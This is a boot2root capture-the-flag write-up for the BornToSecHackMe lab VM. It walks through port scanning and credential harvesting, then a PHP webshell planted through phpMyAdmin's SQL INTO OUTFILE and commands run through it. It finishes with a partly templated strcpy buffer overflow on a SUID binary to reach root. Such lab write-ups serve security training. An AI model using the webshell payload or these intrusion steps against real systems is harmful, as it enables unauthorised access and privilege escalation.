# Boot2Root - Writeup 2

## Summary

This writeup documents the full exploitation chain used to gain root access on the BornToSecHackMe server. The attack goes from network reconnaissance all the way to a root shell through a series of chained vulnerabilities.

---

## Step 1 — Network Reconnaissance

### Finding the target IP

First we identified our Kali machine's IP and network range:

```bash
ip a
# Result: 192.168.128.2/24
```

Then we scanned the network to find the target:

```bash
nmap -sn 192.168.128.0/24
```

Output identified 4 hosts:
```
192.168.128.1  → UTM virtual router
192.168.128.2  → Kali (attacker)
192.168.128.3  → Kali (secondary IP)
192.168.128.4  → TARGET (BornToSecHackMe)
```

### Full port scan

```bash
nmap -sV -sC -p- -T4 192.168.128.4
```

Open ports discovered:
```
21/tcp  → FTP      vsftpd 2.0.8
22/tcp  → SSH      OpenSSH 5.9p1 (Ubuntu)
80/tcp  → HTTP     Apache 2.2.22 — "Hack me if you can"
143/tcp → IMAP     Dovecot mail server
443/tcp → HTTPS    Apache 2.2.22
993/tcp → IMAPS    Dovecot mail server
```

---

## Step 2 — Web Enumeration

### Discovering hidden directories

Used `dirb` to find hidden paths on the web server:

```bash
dirb http://192.168.128.4
```

Found:
```
http://192.168.128.4/forum
http://192.168.128.4/webmail
http://192.168.128.4/phpmyadmin
```

---

## Step 3 — Forum Enumeration

### Finding credentials in forum logs

Visited the forum at `http://192.168.128.4/forum/index.php`.

Found a post by user `lmezard` about login problems. The post contained server logs with this critical line:

```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user 
lqVEj?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```

The user accidentally typed their **password as the username** — the server logged it.

Credentials found:
```
username: lmezard
password: lqVEj?*5K5cy*AJ
```

---

## Step 4 — Webmail Access

### Logging into the forum and webmail

Used the credentials above to log into the forum, then navigated to the webmail at `https://192.168.128.4/webmail`.

Found 2 emails from `qudevide@mail.borntosec.net`:

**Email 1 — Subject: "DB Access"**
```
Hey Laurie,
You can connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
Best regards
```

Database credentials:
```
username: root
password: Fg-'kKXBj87E:aJ$
```

New usernames identified:
```
laurie
qudevide
```

---

## Step 5 — phpMyAdmin to Remote Code Execution

### Accessing phpMyAdmin

MySQL port 3306 was not exposed externally, but phpMyAdmin was accessible at:
```
https://192.168.128.4/phpmyadmin
```

Logged in with:
```
username: root
password: Fg-'kKXBj87E:aJ$
```

### Writing a PHP webshell

In the SQL tab, executed:

```sql
SELECT "<?php system($_GET['cmd']); ?>" 
INTO OUTFILE "/var/www/forum/templates_c/shell.php"
```

This writes a PHP file to the web server's directory. The file takes a `cmd` URL parameter and executes it as a system command.

### Confirming Remote Code Execution

Visited:
```
http://192.168.128.4/forum/templates_c/shell.php?cmd=whoami
```

Output: `www-data` — confirmed RCE as the web server user.

---

## Step 6 — Filesystem Enumeration via Webshell

### Listing home directories

```
?cmd=ls /home
```

Output:
```
LOOKATME  ft_root  laurie  laurie@borntosec.net  lmezard  thor  zaz
```

### the LOOKATME directory


First listed what was inside:
```
http://192.168.128.4/forum/templates_c/shell.php?cmd=ls%20/home/LOOKATME
```

Then read all files inside:
```
http://192.168.128.4/forum/templates_c/shell.php?cmd=cat%20/home/LOOKATME/*

```

Output:
```
lmezard:G!@M6f4Eatau{sF"
```

System credentials for lmezard found.

---

## Step 7 — FTP Access and the fun File

### FTP login

```bash
ftp 192.168.128.4
username: lmezard
password: G!@M6f4Eatau{sF"
```

Found two files:
```
README
fun
```

### Extracting the C code puzzle

The `fun` file was a tar archive:

```bash
tar -xvf fun
```

Extracted 500+ files named `*.pcap` — not real pcap files but pieces of C code, each containing a line number comment like `//file560`.

Used a shell script to reassemble them in order:

```bash
#!/bin/bash
OUTPUT="main.c"
TMPDIR=$(mktemp -d)

for file in *.pcap; do
    line_num=$(grep -o '//file[0-9]*' "$file" | tr -dc '0-9')
    grep -v '//file' "$file" > "$TMPDIR/$line_num"
done

for f in $(ls -v "$TMPDIR"); do
    cat "$TMPDIR/$f"
done > "$OUTPUT"

rm -rf "$TMPDIR"
echo "Created file: $OUTPUT"
```

Compiled and ran the result:

```bash
gcc main.c
./a.out
# Output: MY PASSWORD IS: Iheartpwnage
#         Now SHA-256 it and submit
```

### SHA-256 hashing the password

```bash
echo -n "Iheartpwnage" | sha256sum
# Output: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

---

## Step 8 — SSH as laurie

```bash
ssh laurie@192.168.128.4
password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

Successfully logged in as `laurie`.

---

## Step 9 — Binary Bomb

Found two files in laurie's home:
```
bomb    ← executable binary
README  ← instructions
```

The bomb is a classic CMU binary bomb — a program with 6 phases, each requiring specific input. Wrong answer = explosion.

### Analysis methodology

Used `strings` first to extract readable text:
```bash
strings bomb
```

Then used Ghidra for decompilation — imported the binary, let it analyze, then examined each phase function in the decompiler view.

### Phase solutions

**Phase 1** — Direct string comparison found in strings output:
```
Public speaking is very easy.
```

**Phase 2** — Ghidra decompilation showed factorial sequence logic:
```c
aiStack[i+1] = (i+1) * aiStack[i]
```
Answer:
```
1 2 6 24 120 720
```

**Phase 3** — Switch statement with multiple valid answers. Ghidra showed hex values converted to decimal:
```
1 b 214
```

**Phase 4** — Recursive function `func4`, answer:
```
9
```

**Phase 5** — String mapped through lookup table `isrveawhobpnutfg` to spell `giants`:
```
opekmq
```

**Phase 6** — Node ordering puzzle:
```
4 2 6 3 1 5
```

### Running the bomb with answers file

```bash
./bomb answers.txt
# Phase 1 defused. How about the next one?
# That's number 2. Keep going!
# Halfway there!
# So you got that one. Try this one.
# Good work! On to the next...
# Congratulations! You've defused the bomb!
```

The bomb revealed the password for the next user.

---

## Step 10 — Lateral Movement to thor and zaz

### The bomb password

The bomb's concatenated phase answers form the password for thor:
```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

### SSH as thor

```bash
laurie@BornToSecHackMe:~$ su thor
Password: Publicspeakingisveryeasy.126241207201b2149opekmq426135
thor@BornToSecHackMe:~$
```

### The turtle challenge

Thor's home directory contained:
```
README   → "Finish this challenge and use the result as password for 'zaz' user."
turtle   → a file with directional instructions in French
```

The turtle file contained drawing instructions like:
```
Tourne gauche de 90 degrees
Avance 50 spaces
Avance 1 spaces
Tourne gauche de 1 degrees
[...]
```

These are turtle graphics commands.
Translating and executing them revealed the word **SLASH** being drawn.

At the end of the turtle file was the hint:
```
Can you digest the message? :)
```

The word "digest" hints at hashing. MD5 hashing "SLASH" gives the password for zaz:

```bash
echo -n "SLASH" | md5sum
# 646da671ca01bb5d84dbb5fb2238dc8e
```

### Switch to zaz

```bash
thor@BornToSecHackMe:~$ su zaz
Password: 646da671ca01bb5d84dbb5fb2238dc8e
zaz@BornToSecHackMe:~$
```

---

## Step 11 — Buffer Overflow on exploit_me

### Why this works — SUID permissions

`exploit_me` has **SUID** (Set User ID) permissions set, meaning it runs with the privileges of its **owner (root)** regardless of who executes it:

### Why this works — SUID permissions

`exploit_me` has **SUID** (Set User ID) permissions set, meaning it runs with the privileges of its **owner (root)** regardless of who executes it:

```bash
ls -la exploit_me
# -rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
```

The `s` in the permissions = SUID bit. So any shell spawned by this program inherits root privileges.

### Analyzing the binary

Found `exploit_me` in zaz's home directory. Running it:
```bash
./exploit_me hello
# hello
```

Analyzed with GDB:
```bash
gdb exploit_me
(gdb) disas main
```

The decompiled logic:
```c
int main(int argc, char *argv[]) {
    char buffer[128];
    strcpy(buffer, argv[1]);
    puts(buffer);
    return 0;
}
```

### The vulnerability

`strcpy` performs no bounds checking. If input exceeds 128 bytes, it overwrites memory past the buffer — including the **return address** on the stack.

By overwriting the return address we control where the program jumps after main() finishes.

### Exploitation

Checked protections:
```bash
checksec exploit_me
```

Crafted a payload:
```
[shellcode][padding to fill 128 bytes + 8 bytes][address pointing to shellcode]
```

Executed the exploit to spawn a root shell:
```bash
./exploit_me $(python -c 'print "\x90"*76 + [shellcode] + [return address]')
```

### Result

```bash
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root achieved!**

---

## Attack Chain Summary

```
Network scan          → found target 192.168.128.4
Forum post            → lmezard credentials (password typed as username)
Webmail               → database root credentials
phpMyAdmin            → PHP webshell via SQL INTO OUTFILE
Webshell              → LOOKATME folder → lmezard system password
FTP                   → fun file (C code puzzle)
C puzzle              → Iheartpwnage → SHA256 → laurie SSH access
Binary bomb           → solved 6 phases → thor password
thor challenge        → zaz password
exploit_me            → buffer overflow → ROOT
```

---

## Tools Used

```
nmap      → network and port scanning
dirb      → web directory enumeration
strings   → extract readable text from binaries
Ghidra    → binary decompilation and analysis
gdb       → runtime debugging and exploit development
scp       → file transfer between machines
python    → exploit payload generation
```
